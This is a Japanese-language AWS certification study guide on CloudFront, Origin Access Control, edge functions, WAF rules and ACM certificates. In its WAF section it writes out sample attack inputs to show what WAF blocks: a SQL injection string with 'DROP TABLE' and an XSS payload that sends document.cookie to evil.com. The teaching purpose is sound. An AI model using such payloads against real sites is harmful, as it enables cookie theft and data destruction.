# セクション11: エッジセキュリティ & CDN (Edge Security & CDN)
> Well-Architected Pillars: Security, Performance Efficiency
> Day: 3 | 難易度: 中級

## 概要

エッジセキュリティとCDNは、AWSのグローバルインフラストラクチャを活用して、エンドユーザーに最も近い場所でコンテンツ配信とセキュリティ防御を行うアーキテクチャ層である。CloudFrontは世界700以上のエッジロケーションにコンテンツをキャッシュし、レイテンシを大幅に低減する。WAF (Web Application Firewall) はアプリケーション層 (Layer 7) の攻撃を検出・ブロックする。ACM (AWS Certificate Manager) はTLS証明書のプロビジョニングと自動更新を管理する。

これら3つのサービスは密接に連携して動作する。典型的な構成は「ACMで証明書を取得 → CloudFrontディストリビューションに適用 → WAF Web ACLで保護 → オリジン (S3/ALB) にリクエストを転送」というパターンである。CloudFrontにはLambda@EdgeとCloudFront Functionsというエッジコンピューティング機能もあり、ユーザーに最も近い場所でリクエスト/レスポンスの変換処理を実行できる。

SAA試験では、CloudFrontのキャッシュ動作、OAC (Origin Access Control) によるS3保護、WAFのルール種別、ACMの証明書検証方式、そしてこれらの統合パターンが頻出する。特に「CloudFrontの証明書はus-east-1で作成する必要がある」という制約は定番の出題ポイントである。

## キーコンセプト

### CloudFront

**定義:** AWSのContent Delivery Network (CDN) サービス。世界700以上のエッジロケーションとリージョナルエッジキャッシュにコンテンツをキャッシュし、エンドユーザーに最も近い場所から低レイテンシでコンテンツを配信する。

**ソクラテス式 深堀り:**
> Q: 「CDNとは何か? なぜ必要なのか?」
> A: CDNはコンテンツを世界中に分散配置するネットワークである。例えば東京のユーザーがバージニアのS3バケットから1MBの画像をダウンロードする場合、太平洋を横断する通信で200ms以上のレイテンシが発生する。CloudFrontを使えば、最初のリクエストでバージニアから取得した画像が東京のエッジロケーションにキャッシュされ、以降のリクエストは東京から数ミリ秒で応答される。
> Q: 「CDNがないとどうなるか?」
> A: (1) グローバルユーザーへのレスポンスが遅くなる (物理的距離に比例)。(2) オリジンサーバーに全トラフィックが集中し、過負荷になる。(3) データ転送コストが増加する (オリジンからの直接配信は高コスト)。(4) DDoS攻撃に対してオリジンが直接さらされる。

**現実世界のたとえ (非IT向け):**
> 「フランチャイズレストランチェーン。全ての顧客がバージニアの唯一のオリジナル店舗 (オリジンサーバー) まで行く代わりに、世界中700+都市に支店 (エッジロケーション) を開く。各支店は同じメニュー (キャッシュされたコンテンツ) を遥かに短い配達時間で提供。メニューが変わったら (キャッシュ無効化)、全支店に新メニューを配布」

**CloudFront の主要構成要素:**

| 構成要素 | 説明 |
|----------|------|
| Distribution | CloudFrontの設定単位。1つのドメイン名 (xxx.cloudfront.net) に対応 |
| Origin | コンテンツの元データの場所。S3バケット、ALB、カスタムHTTPサーバー等 |
| Behavior | URLパスパターンに基づくキャッシュルール。/api/* はキャッシュなし、/static/* は24時間キャッシュ等 |
| Cache Policy | キャッシュキーの構成要素とTTLを定義。ヘッダー、クエリ文字列、Cookieのどれをキャッシュキーに含めるか |
| Origin Request Policy | オリジンに転送するヘッダー、クエリ文字列、Cookieを定義。キャッシュキーとは独立 |

**Cache Policy vs Origin Request Policy:**

```
ユーザーリクエスト
  → CloudFront Edge
    → Cache Policy で判定: 「このリクエストのキャッシュキーは何か?」
      → キャッシュヒット: エッジから即座にレスポンス (オリジンに問い合わせない)
      → キャッシュミス: Origin Request Policy に基づいてオリジンに転送
        → 「どのヘッダー/クエリ/Cookieをオリジンに送るか?」
```

**重要な設計ポイント:** Cache Policyに含めるパラメータが多いほどキャッシュキーのバリエーションが増え、キャッシュヒット率が下がる。例えばUser-AgentヘッダーをCache Policyに含めると、ブラウザごとに別キャッシュが作られ、効率が大幅に低下する。

---

### Origin Access Control (OAC)

**定義:** CloudFrontからS3バケットへのアクセスをCloudFront経由のみに制限する仕組み。S3バケットへの直接アクセスをブロックし、全てのリクエストがCloudFrontを経由することを強制する。OAI (Origin Access Identity) の後継であり、OACが推奨される。

**ソクラテス式 深堀り:**
> Q: 「なぜOACが必要なのか? S3バケットポリシーだけでは不十分か?」
> A: CloudFrontの目的の一つはWAFによるセキュリティ防御である。しかし、ユーザーがS3のURLに直接アクセスできてしまうと、CloudFront (WAF) をバイパスできる。OACはS3バケットポリシーにCloudFrontディストリビューションからのアクセスのみ許可する条件を追加し、直接アクセスを完全にブロックする。
> Q: 「OACとOAI (旧方式) の違いは?」
> A: OACはSigV4署名ベースで、S3の全機能 (SSE-KMS暗号化含む) に対応する。OAIはレガシーで、SSE-KMSに非対応、リージョン制限がある等の制約があった。新規構築ではOACを使用する。

**S3バケットポリシー (OAC用):**

```json
{
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "cloudfront.amazonaws.com"
      },
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "StringEquals": {
          "AWS:SourceArn": "arn:aws:cloudfront::123456789012:distribution/EXXXXXXXXXXXXX"
        }
      }
    }
  ]
}
```

---

### Lambda@Edge と CloudFront Functions

**定義:** CloudFrontのエッジロケーションでコードを実行するサーバーレスコンピューティング機能。リクエスト/レスポンスの変換、認証、URLリライト等をオリジンに到達する前に処理できる。

**ソクラテス式 深堀り:**
> Q: 「エッジコンピューティングとは何か? なぜオリジンで処理しないのか?」
> A: オリジン (バージニアのサーバー) で全ての処理を行うと、東京のユーザーのリクエストがバージニアまで往復する。エッジロケーション (東京) で処理できれば、レイテンシが大幅に低減される。例えばリダイレクト処理やヘッダー追加のような軽量な処理をエッジで行えば、オリジンの負荷も軽減される。

**現実世界のたとえ (非IT向け):**
> 「地方に支店を置くだけでなく、支店に簡単な判断権限 (Lambda@Edge) も与えるようなもの。『本社に確認します』と毎回電話 (オリジンに転送) せず、支店の担当者がその場で対応できる」

**Lambda@Edge vs CloudFront Functions 比較:**

| 特徴 | CloudFront Functions | Lambda@Edge |
|------|---------------------|-------------|
| 実行場所 | エッジロケーション (700+) | リージョナルエッジキャッシュ (13) |
| ランタイム | JavaScript のみ | Node.js, Python |
| 実行時間上限 | 1ms | 5秒 (Viewer) / 30秒 (Origin) |
| メモリ | 2 MB | 128 - 10,240 MB |
| ネットワークアクセス | 不可 | 可能 |
| ファイルシステム | 不可 | /tmp (512 MB) |
| リクエストボディアクセス | 不可 | 可能 |
| コスト | 安い ($0.10/100万リクエスト) | 高い (Lambda標準料金) |
| デプロイリージョン | どこからでも | us-east-1 のみ |

**トリガーポイント:**

```
User → [Viewer Request] → CloudFront Cache → [Origin Request] → Origin Server
                                                                      ↓
User ← [Viewer Response] ← CloudFront Cache ← [Origin Response] ← Origin Server

CloudFront Functions: Viewer Request / Viewer Response のみ
Lambda@Edge: 全4つのトリガーポイントで実行可能
```

**ユースケース別の選択指針:**

| ユースケース | 推奨 | 理由 |
|-------------|------|------|
| URLリライト/リダイレクト | CloudFront Functions | 軽量処理、高速 |
| ヘッダー追加/変更 | CloudFront Functions | 軽量処理 |
| JWT認証トークン検証 | CloudFront Functions | ネットワーク不要 |
| A/Bテスト (Cookie操作) | CloudFront Functions | 軽量処理 |
| 画像のリサイズ/変換 | Lambda@Edge | 重い処理、メモリ必要 |
| 外部API呼び出しを含む認証 | Lambda@Edge | ネットワークアクセス必要 |
| オリジンの動的選択 | Lambda@Edge | Origin Request トリガー |
| レスポンスボディの変換 | Lambda@Edge | ボディアクセス必要 |

---

### Price Classes (価格クラス)

**定義:** CloudFrontのPrice Classは、コンテンツを配信するエッジロケーションの地理的範囲を制限する機能。高コストのリージョン (南米、オーストラリア等) を除外することでコストを最適化できる。

| Price Class | 対象リージョン | コスト |
|-------------|-------------|--------|
| Price Class All | 全エッジロケーション | 最高 |
| Price Class 200 | 北米、ヨーロッパ、アジア、中東、アフリカ | 中間 |
| Price Class 100 | 北米、ヨーロッパのみ | 最低 |

**注意:** Price Classで除外されたリージョンのユーザーはアクセスが拒否されるわけではなく、含まれているリージョンの最寄りのエッジロケーションから配信される。レイテンシは増加するがアクセスは可能。

---

### WAF (Web Application Firewall)

**定義:** Webアプリケーションを一般的なWeb攻撃 (SQLインジェクション、XSS、Bot攻撃等) から保護するマネージドファイアウォール。CloudFront、ALB、API Gateway、AppSync、Cognito User Poolsに適用可能。

**ソクラテス式 深堀り:**
> Q: 「WAFとは何か? Security Groupとの違いは何か?」
> A: Security GroupはLayer 3/4 (IPアドレス、ポート、プロトコル) でフィルタリングする。WAFはLayer 7 (HTTPリクエストの内容) でフィルタリングする。Security Groupは「このIPからの443接続を許可」、WAFは「HTTPリクエストのボディにSQLインジェクションパターンが含まれていたらブロック」という違い。攻撃者が正規のIP/ポートを使って悪意あるHTTPリクエストを送信した場合、Security Groupでは防げないがWAFでは防げる。
> Q: 「WAFがないとどうなるか?」
> A: SQLインジェクション攻撃でデータベースの内容が漏洩する。XSS攻撃でユーザーのセッション情報が盗まれる。Bot攻撃でアカウント乗っ取りやWebスクレイピングが行われる。これらの攻撃はNetwork層のファイアウォールでは防止できない。

**Web ACL の構成:**

```
Web ACL (WCU: 5000)
  │
  ├── Rule 1 (Priority: 0): IP Set - Known Bad IPs → BLOCK
  │     WCU: 1
  │
  ├── Rule 2 (Priority: 1): Rate-Based Rule - 2000 req/5min → BLOCK
  │     WCU: 2
  │
  ├── Rule 3 (Priority: 2): AWS Managed - Core Rule Set → BLOCK
  │     WCU: 700
  │     (SQLi, XSS, SSRF, LFI等の一般的な攻撃パターンを検出)
  │
  ├── Rule 4 (Priority: 3): AWS Managed - Known Bad Inputs → BLOCK
  │     WCU: 200
  │     (Log4j, Spring4Shell等の既知の脆弱性エクスプロイトを検出)
  │
  ├── Rule 5 (Priority: 4): AWS Managed - Bot Control → BLOCK/CHALLENGE
  │     WCU: 50
  │
  └── Default Action: ALLOW
```

**WCU (Web ACL Capacity Units):** 各ルールには処理コストに応じたWCUが割り当てられる。Web ACLあたりのデフォルト上限は5,000 WCU。複雑なルールほどWCUが高い。

**ルール種別:**

| ルール種別 | 説明 | ユースケース |
|-----------|------|------------|
| Regular Rule | リクエストの属性に基づくマッチング | IP制限、ヘッダー検査、ボディ検査 |
| Rate-Based Rule | 5分間のリクエスト数でレート制限 | DDoS緩和、ブルートフォース防止 |
| Group Rule | 複数ルールのグループ | マネージドルールグループの利用 |

---

### SQLインジェクションとXSS

**SQLインジェクション:**

**現実世界のたとえ (非IT向け):**
> 「図書館の貸出フォームに名前を書く欄があるとします。普通は『田中太郎』と書く。でも悪意ある人が『田中太郎'; DROP TABLE Students;--』と書いたら? 司書 (アプリケーション) がチェックせずそのままコンピュータに入力すると、破壊的なコマンドが実行されて全学生データが消える。WAFはフォームの内容をチェックして、怪しいパターンをブロックする門番」

```
正常なリクエスト:
  GET /users?id=123

SQLインジェクション攻撃:
  GET /users?id=123 OR 1=1; DROP TABLE users;--

WAFの検出: クエリパラメータに SQL キーワード (OR, DROP, TABLE, --)
          のパターンを検出 → BLOCK
```

**XSS (Cross-Site Scripting):**

**現実世界のたとえ (非IT向け):**
> 「掲示板に誰かが『こんにちは』の代わりにJavaScriptコードを投稿するようなもの。他の人がその掲示板を見ると、ブラウザがそのコードを実行してしまい、クッキー (セッション情報) を盗まれる可能性がある」

```
正常な投稿:
  POST /comment body={"text": "こんにちは"}

XSS攻撃:
  POST /comment body={"text": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}

WAFの検出: リクエストボディに <script> タグや JavaScript イベントハンドラ
          のパターンを検出 → BLOCK
```

---

### ACM (AWS Certificate Manager)

**定義:** SSL/TLS証明書のプロビジョニング、管理、デプロイを行うサービス。パブリック証明書は無料で発行され、自動更新される。CloudFront、ALB、API Gateway等のAWSサービスに統合される。

**ソクラテス式 深堀り:**
> Q: 「TLS証明書とは何か? なぜ必要なのか?」
> A: TLS証明書はWebサイトの身元を証明し、通信を暗号化するデジタル証明書である。証明書がなければ、(1) ブラウザが「安全ではないサイト」と警告を表示する、(2) 通信内容が平文で傍受可能になる、(3) フィッシングサイトとの区別がつかない。
> Q: 「ACMがないとどうなるか?」
> A: 従来は証明書の購入 ($100-$1000/年)、手動インストール、期限管理を全て自分で行う必要があった。証明書の期限切れは深刻な障害 (サイトアクセス不能) を引き起こす。ACMは無料で証明書を発行し、自動更新するため、運用負荷を大幅に削減する。

**現実世界のたとえ (非IT向け):**
> 「お店の営業許可証のようなもの。この証明書がないと、ブラウザは『安全ではないサイト』と警告する。ACMは無料で証明書を発行し、期限が来たら自動更新してくれる免許センター」

**証明書の種類と特徴:**

| 特徴 | パブリック証明書 | プライベート証明書 |
|------|----------------|-------------------|
| 費用 | 無料 | AWS Private CA の料金が発生 |
| 用途 | インターネット向けサービス | 社内/VPN内のサービス |
| 自動更新 | DNS/Email検証で自動 | 自動 |
| 発行元 | Amazon Trust Services | AWS Private CA |
| 信頼性 | ブラウザが自動信頼 | 自社の信頼チェーンを構築 |

**検証方式:**

| 方式 | 仕組み | 推奨度 | 自動更新 |
|------|--------|--------|---------|
| DNS検証 | 指定されたCNAMEレコードをDNSに追加 | 推奨 | 可能 (CNAMEが存在する限り) |
| Email検証 | ドメイン管理者のメールアドレスに確認メール | 非推奨 | 手動更新が必要 |

**重要な制約:**
- **CloudFrontの証明書は us-east-1 (バージニア) で作成する必要がある。** CloudFrontはグローバルサービスであり、us-east-1のACMとのみ統合される。
- **ALBの証明書はALBと同じリージョン** で作成する必要がある。
- 証明書のエクスポートは不可 (ACM管理の証明書はAWSサービスからのみ利用可能)。
- 証明書透過性ログ (Certificate Transparency Logging) はデフォルトで有効。公的な証明書透過性ログに記録される。

---

### CloudFront + WAF + ACM 統合パターン

**定義:** CloudFront、WAF、ACMを組み合わせた、エッジでのセキュアなコンテンツ配信の標準的なアーキテクチャパターン。

**統合フロー:**

```
1. ACM (us-east-1) で TLS 証明書を発行
   ↓ DNS検証でドメイン所有を証明
2. CloudFront Distribution を作成
   ├── Alternative Domain Name: www.example.com
   ├── SSL Certificate: ACM証明書 (us-east-1)
   ├── Origin: S3 バケット (OAC設定) または ALB
   ├── Cache Behaviors: 静的コンテンツ→キャッシュ / API→キャッシュなし
   └── WAF Web ACL: 作成した Web ACL を関連付け
3. WAF Web ACL を作成
   ├── AWS Managed Rules (Core Rule Set, Known Bad Inputs)
   ├── Rate-Based Rule (DDoS緩和)
   └── Custom Rules (IP制限、地理的制限等)
4. Route 53 で CNAME/Alias を設定
   └── www.example.com → xxx.cloudfront.net
```

**全体像:**

```
User (東京)
  → Route 53 DNS (www.example.com → CloudFront)
    → CloudFront Edge (東京)
      → WAF Web ACL (SQLi/XSS/Bot検査)
        → CloudFront Functions (ヘッダー追加等)
          → Cache Hit? → Yes → 即座にレスポンス
                       → No  → Origin (S3/ALB)
                                  ↓
User ← TLS暗号化レスポンス (ACM証明書)
```

## アーキテクチャパターン

### パターン1: 静的WebサイトホスティングwithCloudFront

```
Route 53
  │ Alias Record: www.example.com → CloudFront
  │
CloudFront Distribution
  ├── ACM Certificate (us-east-1): *.example.com
  ├── WAF Web ACL: Core Rule Set + Rate Limiting
  ├── Default Behavior:
  │     Cache Policy: CachingOptimized (TTL: 24h)
  │     Origin: S3 Bucket (OAC)
  ├── Behavior /api/*:
  │     Cache Policy: CachingDisabled
  │     Origin Request Policy: AllViewer
  │     Origin: ALB
  └── CloudFront Function (Viewer Request):
        URL Rewrite: /about → /about/index.html

S3 Bucket (Static Website)
  ├── Block Public Access: 全て有効
  ├── Bucket Policy: CloudFront OACのみ許可
  └── コンテンツ: HTML, CSS, JS, 画像
```

### パターン2: マルチオリジンAPI + 静的コンテンツ

```
CloudFront Distribution
  │
  ├── Behavior: /static/* (Priority: 0)
  │     Origin: S3 Bucket
  │     Cache: CachingOptimized (24時間)
  │     Compress: Yes (gzip/brotli)
  │
  ├── Behavior: /api/v1/* (Priority: 1)
  │     Origin: ALB (ap-northeast-1)
  │     Cache: Disabled
  │     Origin Request Policy: AllViewerExceptHostHeader
  │     WAF: SQL injection + XSS rules
  │
  ├── Behavior: /api/v2/* (Priority: 2)
  │     Origin: API Gateway
  │     Cache: Disabled
  │
  └── Default Behavior (Priority: last)
        Origin: S3 Bucket (SPA index.html)
        Cache: CachingOptimized
        CloudFront Function: SPA routing

メリット:
  - 単一ドメインで静的コンテンツ + API を配信 (CORS不要)
  - パスパターンでオリジンを振り分け
  - 静的コンテンツのみキャッシュ、APIはパススルー
```

### パターン3: WAFによる多層防御

```
Layer 1: IP Reputation (Priority: 0)
  ├── AWS Managed: Amazon IP Reputation List
  └── Custom: 社内ブロックリスト (IP Set)

Layer 2: Rate Limiting (Priority: 1)
  ├── Global: 2000 req/5min per IP
  └── /login: 50 req/5min per IP (ブルートフォース防止)

Layer 3: Bot Management (Priority: 2)
  ├── AWS Managed: Bot Control
  └── CAPTCHA for suspicious bots

Layer 4: Application Protection (Priority: 3)
  ├── AWS Managed: Core Rule Set (SQLi, XSS, SSRF, LFI)
  ├── AWS Managed: Known Bad Inputs (Log4j etc.)
  └── AWS Managed: SQL Injection Rule Set

Layer 5: Geo Restriction (Priority: 4)
  └── Custom: 許可する国のみ ALLOW

Default Action: ALLOW (全レイヤーを通過したリクエスト)

Logging:
  WAF Logs → S3 (長期保存) + CloudWatch (リアルタイムモニタリング)
```

## SAA試験のポイント

- **CloudFrontの証明書は必ず us-east-1 (バージニア) の ACM で作成する。** 他のリージョンの証明書はCloudFrontに使用できない。ALBの証明書はALBと同じリージョンで作成する。
- **OAC (Origin Access Control) は OAI (Origin Access Identity) の後継。** 新規構築ではOACを使用する。OACはSSE-KMS暗号化されたS3オブジェクトにも対応する。
- **S3をCloudFrontのオリジンにする場合、S3のStatic Website Hosting機能は使わない** のがベストプラクティス。OACを使用してCloudFront経由のみのアクセスに制限する。ただし、リダイレクトやカスタムエラーページが必要な場合はStatic Website Hostingエンドポイントをカスタムオリジンとして使用することもある。
- **Cache Policy と Origin Request Policy は別の概念。** Cache Policyはキャッシュキーの決定、Origin Request Policyはオリジンに転送するデータの決定。両方を適切に設定しないとキャッシュ効率が低下する。
- **Lambda@Edge は us-east-1 でのみ作成可能。** CloudFront Functionsはどのリージョンからでも作成可能。軽量処理はCloudFront Functions、重い処理やネットワークアクセスが必要な処理はLambda@Edge。
- **WAFのRate-Based Ruleは5分間のリクエスト数** でカウントする。閾値は100から設定可能。DDoSやブルートフォース攻撃への対策に使用する。
- **WAFはCloudFront、ALB、API Gateway、AppSync、Cognito User Poolsに適用可能。** EC2やNLBには直接適用できない。NLBの背後のアプリケーションを保護するにはALBを挟む必要がある。
- **DNS検証はEmail検証より推奨される。** CNAMEレコードが存在する限り自動更新が可能であり、手動介入が不要。Route 53を使用している場合はACMからワンクリックでCNAMEレコードを作成できる。
- **CloudFront Functions vs Lambda@Edge:** CloudFront Functionsは実行時間1ms以下、JavaScript専用、ネットワークアクセス不可だがコストが安い。Lambda@Edgeは最大30秒、Node.js/Python対応、ネットワークアクセス可能だがコストが高い。
- **CloudFrontの Price Class** はコスト最適化に使用する。Price Class 100 (北米+ヨーロッパ) が最安。除外されたリージョンのユーザーもアクセス可能 (含まれるリージョンから配信)。
- **Shield Standard は CloudFront に自動適用** される (追加費用なし)。Layer 3/4のDDoS保護を提供する。Shield Advancedは追加費用で高度な保護と24/7 DRTサポートを提供する。

## ハンズオン参照

- CDKプロジェクト: `cdk-projects/05-security-edge/`
- 構築する主要リソース:
  - CloudFront Distribution (S3オリジン + ALBオリジン)
  - Origin Access Control (OAC) 設定
  - WAF Web ACL (Core Rule Set + Rate-Based Rule)
  - ACM 証明書 (DNS検証)
  - CloudFront Function (URLリライト)
  - S3 バケット (静的コンテンツ、パブリックアクセスブロック有効)
- 確認ポイント:
  - S3バケットに直接アクセスが拒否され、CloudFront経由のみアクセスできることを確認
  - WAFでSQLインジェクションパターンのリクエストがブロックされることを確認
  - CloudFront Functions でURLリライトが動作することを確認
  - ACM証明書でHTTPS接続が確立されることを確認
  - Price Classの変更がエッジロケーションの分布に影響することを確認
  - WAFのログがS3に出力されていることを確認

## Well-Architected チェックリスト

### Security
- [ ] CloudFrontのS3オリジンにOAC (Origin Access Control) が設定されているか
- [ ] S3バケットのパブリックアクセスブロックが全て有効化されているか
- [ ] WAF Web ACLがCloudFrontディストリビューションに関連付けられているか
- [ ] WAFにSQLインジェクション、XSS、既知の脆弱性エクスプロイトの防御ルールが含まれているか
- [ ] Rate-Based RuleでDDoSおよびブルートフォース攻撃を緩和しているか
- [ ] ACM証明書がDNS検証で自動更新されるように設定されているか
- [ ] TLS 1.2以上が強制されているか (Security Policy)
- [ ] 地理的制限 (Geo Restriction) が必要に応じて設定されているか

### Performance Efficiency
- [ ] Cache PolicyがコンテンツタイプごとにTTLを最適化しているか
- [ ] 静的コンテンツのキャッシュヒット率をモニタリングしているか (目標: 90%以上)
- [ ] gzip/brotli圧縮が有効化されているか
- [ ] 不要なヘッダー/Cookie/クエリ文字列がCache Policyに含まれていないか
- [ ] Price Classがターゲットユーザーの地理的分布に基づいて選択されているか
- [ ] キャッシュ無効化 (Invalidation) の頻度が適切か (頻繁な無効化はコスト増)
- [ ] 軽量な処理にはCloudFront Functions、重い処理にはLambda@Edgeを使い分けているか
